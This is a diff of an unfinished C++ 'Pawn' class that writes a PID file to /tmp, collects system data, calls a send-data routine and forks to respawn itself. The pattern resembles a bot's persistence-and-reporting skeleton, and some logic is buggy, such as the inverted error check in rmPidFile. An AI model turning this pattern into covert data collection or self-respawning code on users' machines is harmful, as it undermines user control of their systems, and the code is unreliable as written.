@@ -2,27 +2,12 @@
 // Created by nn5h on 7/23/19.
 //
 
-#include "Pawn.h"
-
 #include <unistd.h>
 #include <stdio.h>
 #include <iostream>
 #include <fstream>
+#include "Pawn.h"
 
-
-Pawn::Pawn() {
-    currentPID = getpid();
-
-    systemData = SystemDataCollector();
-    int sendSystemDataResult = sendMyselfData();
-    reborn();
-    doWork();
-
-}
-
-Pawn::~Pawn() {
-    rmPidFile();
-}
 
 int Pawn::sendMyselfData() {
 
@@ -42,45 +27,69 @@ int Pawn::needReborn() {
     } else return 1;
 }
 
-int readPidFile(std::string fname) {
-    std::fstream fs;
+int Pawn::readPidFile(std::string fname) {
+    std::ifstream fs(fname);
 
-    if (fs.is_open()) {
-        std::string line;
-        getline(file, line);
-        int gotPid = std::atoi(line);
-        printf("Got %d\n", gotPid);
-        fs.close();
-    }
+    if (fs.fail()) return -1;
+
+    std::string line;
+    fs >> line;
+    int gotPid = std::stoi(line);
+    printf("Got %d\n", gotPid);
+    fs.close();
 
     return gotPid;
+
 }
 
 void Pawn::reborn() {
     if (needReborn() == 1) {
         // fork here
         int child1 = fork();
-        std::cout << "Child 1 pid = " << child1 << std::endl;
-        child1.
+        std::cout << "Child 1 pid = " << getpid() << std::endl;
+
+        int ppid = readPidFile("/tmp/pawn.pid");
+        if (ppid != -1){
+            // parent exists
+            std::cout << ppid << std::endl;
+        }
     }
 }
 
 void Pawn::doWork() {
-    for (int i = 0; i < 1000; i++) {
+    for (int i = 0; i < 10; i++) {
         std::cout << i << " step" << std::endl;
         std::this_thread::sleep_for(std::chrono::milliseconds(500));
     }
 }
 
 void Pawn::pidToFile(std::string fname) {
-    ofstream myfile;
-    myfile.open (fname);
-    myfile << currentPID;
-    myfile.close();
+    std::ofstream fs;
+    fs.open(fname);
+    fs << currentPID;
+    fs.close();
 }
 
-void rmPidFile(std::string fname) {
-    if (remove(fname)) {
-        perror("Error deleting a %s", fname);
+void Pawn::rmPidFile(std::string fname) {
+    std::remove(fname.c_str());
+
+    bool failed = !std::ifstream(fname);
+    if (failed) {
+        std::perror("Error opening deleted file");
     }
+}
+
+Pawn::Pawn() {
+    currentPID = getpid();
+    pidToFile("/tmp/pawn.pid");
+
+    systemData = SystemDataCollector();
+    int sendSystemDataResult = sendMyselfData();
+    reborn();
+    doWork();
+
+}
+
+Pawn::~Pawn() {
+    rmPidFile("/tmp/pawn.pid");
 }
